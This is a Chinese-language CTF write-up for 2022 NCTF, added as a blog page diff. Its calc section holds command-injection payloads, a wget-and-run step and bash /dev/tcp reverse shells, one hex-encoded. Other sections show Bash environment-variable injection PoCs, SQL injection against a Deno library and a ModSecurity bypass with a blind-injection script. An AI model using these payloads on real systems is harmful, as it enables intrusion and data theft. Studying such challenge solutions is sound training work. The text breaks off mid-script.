@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>2022NCTF部分wp - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="2022NCTF的部分wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022NCTF部分wp">
+<meta property="og:url" content="http://example.com/2023/07/03/%E6%AF%94%E8%B5%9Bwp/2022NCTF/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="2022NCTF的部分wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212031511974.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050836661.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050846791.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050923066.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212051006921.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212082335699.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212142232562.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212142233229.png">
+<meta property="article:published_time" content="2023-07-03T08:59:14.502Z">
+<meta property="article:modified_time" content="2023-07-03T08:59:14.556Z">
+<meta property="article:author" content="v2ish1yan">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212031511974.png">
+  
+  
+  
+  <meta name="keywords" content="CTF,WEB">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/links/">友链</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">2022NCTF部分wp</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin"><span class="toc-text">Signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-text">calc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">非预期</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6flag%E6%96%87%E4%BB%B6%E5%88%B0static%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-text">复制flag文件到static文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3%E3%80%90calc-revenge%E3%80%91"><span class="toc-text">预期解【calc_revenge】</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf"><span class="toc-text">绕过waf</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-sql"><span class="toc-text">ez_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-bypass"><span class="toc-text">ez_bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1"><span class="toc-text">payload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload2"><span class="toc-text">payload2</span></a></li></ol></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/WP/">WP</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-07-03T08:59:14.502Z">2023-07-03</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>2022NCTF部分wp</span></h1>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><blockquote>
+<p>程序设计实验作业,但是签到题(听zys说建议把终端字体调小一点并且只需要输入一串来自35年前的神秘秘籍</p>
+</blockquote>
+<p>35年前的秘籍，就是魂斗罗的秘籍</p>
+<p><strong>上、上、下、下、左、右、左、右、B、A、B、A</strong></p>
+<p>就可以得到flag</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212031511974.png" alt="image-20221203151055783" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221203151055783</span></div></div>
+
+<p><code>NCTF&#123;VVe1c0m3_T0_NCTF_2022!!!&#125;</code></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><ul>
+<li>命令注入</li>
+<li>环境变量注入</li>
+</ul>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050836661.png" alt="image-20221205083628550" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221205083628550</span></div></div>
+
+<p>网页源码里有提示<code>/source</code>,得到源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>得知这里有waf，通过报错页面可以得到waf的内容<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050846791.png" alt="image-20221205084607722" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221205084607722</span></div></div></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>这里是走<strong>os.system()利用换行来执行多条命令</strong></p>
+<p>但是要先让eval()执行成功才能走到os.system</p>
+<p>所以要用’’’来表示python的多行代码，同时os.system执行第一条执行成功后才会执行第二条命令，所以要加一个’来闭合前面的’’’，结尾同理</p>
+<p>用%09来替代空格</p>
+<p>这里有两种方法</p>
+<h4 id="复制flag文件到static文件夹"><a href="#复制flag文件到static文件夹" class="headerlink" title="复制flag文件到static文件夹"></a>复制flag文件到static文件夹</h4><p>static文件夹是flask的静态文件夹，我们是可以访问到的</p>
+<p>而且在报错页面也可以知道app.py的运行目录</p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: /calc?num=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;w&#x27;</span>%0acp%09/*f*%09/home/static/v2%0a<span class="string">&#x27;123&#x27;</span><span class="string">&#x27;&#x27;</span><span class="comment">#f也可以换成大写试一下</span></span><br></pre></td></tr></table></figure>
+
+<p>这条代码执行后的log是</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212050923066.png" alt="image-20221205092316035" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221205092316035</span></div></div>
+
+<p>然后在&#x2F;static&#x2F;v2下载就行</p>
+<blockquote>
+<p>但是如果有坏b把flag文件弄走了就没办法了</p>
+</blockquote>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>因为反弹shell的命令里有被ban的字符，可以先把命令下载下来，然后再去执行他</p>
+<p>v2.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">bash -c <span class="string">&#x27; bash -i &amp;&gt; /dev/tcp/&#123;vpshost&#125;/&#123;vpsport&#125; 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: /calc?num=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;w&#x27;</span>%0awget%09&#123;vpshost&#125;/v2.sh%0a<span class="string">&#x27;123&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">GET: /calc?num=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;w&#x27;</span>%0abash%09v2.sh%0a<span class="string">&#x27;123&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212051006921.png" alt="image-20221205100635894" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221205100635894</span></div></div>
+
+
+
+<hr>
+<p>原来我上面写的是非预期XD</p>
+<h3 id="预期解【calc-revenge】"><a href="#预期解【calc-revenge】" class="headerlink" title="预期解【calc_revenge】"></a>预期解【<strong>calc_revenge</strong>】</h3><p>出题师傅的预期解是利用环境变量注入来执行命令，这里涉及到p佬的一篇文章<a target="_blank" rel="noopener" href="https://tttang.com/archive/1450/#toc_0x01-ld_preload">我是如何利用环境变量注入执行任意命令</a></p>
+<p>这里是因为python3的os.system()也是利用&#x2F;bin&#x2F;sh -c 来执行的</p>
+<p>在subproccess.py文件中</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212082335699.png" alt="image-20221208232726462" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221208232726462</span></div></div>
+
+<p>所以可以使用环境变量进行注入</p>
+<p>p佬文章中的三个poc</p>
+<blockquote>
+<ul>
+<li>Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如<code>TEST=() &#123; :; &#125;; id;</code></li>
+<li>Bash 4.4以前：<code>env $&#39;BASH_FUNC_echo()=() &#123; id; &#125;&#39; bash -c &quot;echo hello&quot;</code></li>
+<li>Bash 4.4及以上：<code>env $&#39;BASH_FUNC_echo%%=() &#123; id; &#125;&#39; bash -c &#39;echo hello&#39;</code></li>
+</ul>
+<p>在CentOS系系统下完美解决本文开头提到的问题，通杀所有Bash。</p>
+</blockquote>
+<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>接下来就是进行环境变量的覆盖，因为python的环境变量是以字典的形式存在的</p>
+<p>可以使用python的list生成器和中括号进行变量覆盖</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&quot;aaa&quot;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">[[<span class="built_in">str</span>][<span class="number">0</span>]<span class="keyword">for</span>[a[<span class="string">&#x27;aaa&#x27;</span>]]<span class="keyword">in</span>[[<span class="string">&#x27;111&#x27;</span>]]]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#&#123;&#x27;aaa&#x27;: &#x27;111&#x27;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">Python黑魔法-绕过空格实现变量覆盖</a>(这篇文章中有写过原理，但是使用这里面的方式成功不了，本地都无法执行)</p>
+<p>然后就是进行覆盖了，一个个试poc</p>
+<h4 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h4><p>在引号包裹中的字符可以使用绕过，16进制或者unicode编码都行</p>
+<p>然后就是绕过os，这个没有被引号包裹的字符</p>
+<p>这里直接使用Pupi1师傅的文字</p>
+<blockquote>
+<p>但实际上python是支持Non-ASCII Identifies也就是说可以使用unicode字符的，具体参考见: <a target="_blank" rel="noopener" href="https://peps.python.org/pep-3131/">https://peps.python.org/pep-3131/</a> ，也就是说如果我们使用了UTF-8中的非ASCII码作为标识符，那么其会被函数转换为NFKC标准格式，也就是说我们可以使用例如<code>ᵒ</code>来代替<code>o</code>，从而绕过限制。</p>
+</blockquote>
+<p>最终的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="built_in">str</span>][<span class="number">0</span>]<span class="keyword">for</span>[ᵒs.environ[<span class="string">&#x27;BASH\x5fFUNC\x5fecho%%&#x27;</span>]]<span class="keyword">in</span>[[<span class="string">&#x27;\x28\x29\x20\x7b\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x78\x2e\x78\x78\x2e\x78\x78\x2e\x78\x78\x2f\x78\x78\x78\x78\x20\x30\x3e\x26\x31\x3b\x7d&#x27;</span>]]]</span><br><span class="line"><span class="comment">#() &#123; bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><ul>
+<li>deno的bug</li>
+</ul>
+<p>这个在hack.lu ctf中出现过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/">foodAPI</a></p>
+<p>在后面多传一个?参数就会造成bug，从而导致注入</p>
+<p>摘自HuLi的博客:</p>
+<blockquote>
+<p>但是deno 的lib 忘记对栏位名称的 <code>?</code> 做escape 了，所以如果你传：<code>&#123;&quot;id&quot;:&quot;1&quot;, &quot;?&quot;: &quot;A&quot;&#125;</code>，最后出来的SQL 会是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from  `food`  where  `id` =? and  `?` =?</span><br></pre></td></tr></table></figure>
+
+<p>而bind 完之后就会变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from  `food`  where  `id` = &#x27;1&#x27;  and  `&#x27;A&#x27;` =?</span><br></pre></td></tr></table></figure>
+
+<p>你会发现A 那边可以做SQL injection，只要先闭合那个反引号就行了。</p>
+<p>但问题是这样会产生不合法的栏位名称，因为里面一定有个单引号，像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from  `food`  where  `id` = &#x27;1&#x27;  and  `&#x27;name` --&#x27;=?</span><br></pre></td></tr></table></figure>
+
+<p>会出现：</p>
+<p>Error: no such column: ‘name</p>
+</blockquote>
+<p>然后使用下面的闭合方式可以绕过不存在的字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  id  <span class="keyword">from</span> food <span class="keyword">where</span>  `<span class="string">&#x27;not_exist&#x27;</span>`  <span class="keyword">and</span>  <span class="number">0</span>  <span class="keyword">union</span>  <span class="keyword">select</span>  <span class="number">1</span> ; </span><br><span class="line"><span class="keyword">select</span>  id  <span class="keyword">from</span> food <span class="keyword">where</span>  `<span class="string">&#x27;not_exist&#x27;</span>`  <span class="keyword">in</span> () <span class="keyword">union</span>  <span class="keyword">select</span>  <span class="number">1</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: /flight?id=1&amp;?=`+and+0+union+select+1,flag+from+flag --</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202212142232562.png" alt="image-20221205170802842" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20221205170802842</span></div></div>
+
+<h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><ul>
+<li>modsecurity bypass</li>
+</ul>
+<h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>给出的hint里知道waf用的是modsecurity</p>
+<blockquote>
+<p>ModSecurity是一个开源的、跨平台的Web应用防火墙（WAF），被称为WAF界的“瑞士军刀”。它可以通过检查Web服务接收到的数据，以及发送出去的数据来对网站进行安全防护</p>
+</blockquote>
+<p>在网上搜bypass方法</p>
+<p><a target="_blank" rel="noopener" href="https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html">https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html</a></p>
+<p>modsecurity是利用<code>Libinjection</code>进行语义分析，所以常规的and，or，||，&amp;&amp;都不能用了作为连接符</p>
+<p>这里使用<code>^</code>（异或）来连接两个语句从而进行注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: /sql.php?<span class="built_in">id</span>=1^(1.e(ascii 1.e(substring(1.e(<span class="keyword">select</span> password from users.info <span class="built_in">where</span> <span class="built_in">id</span>=1) 1.e,&#123;&#125; 1.e,1 1.e)1.e)1.e)=&#123;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>当正确的时候，页面不会有回显</p>
+<p>利用脚本进行盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://121.37.11.207:8099/sql.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&quot;1^(1.e(ascii 1.e(substring(1.e(select password from users.info where id=1) 1.e,&#123;&#125; 1.e,1 1.e)1.e)1.e)=&#123;&#125;)&quot;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">43</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        url_end=url+payload1.<span class="built_in">format</span>(x,i)</span><br><span class="line">        res=requests.get(url_end)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;letian&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            result+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span 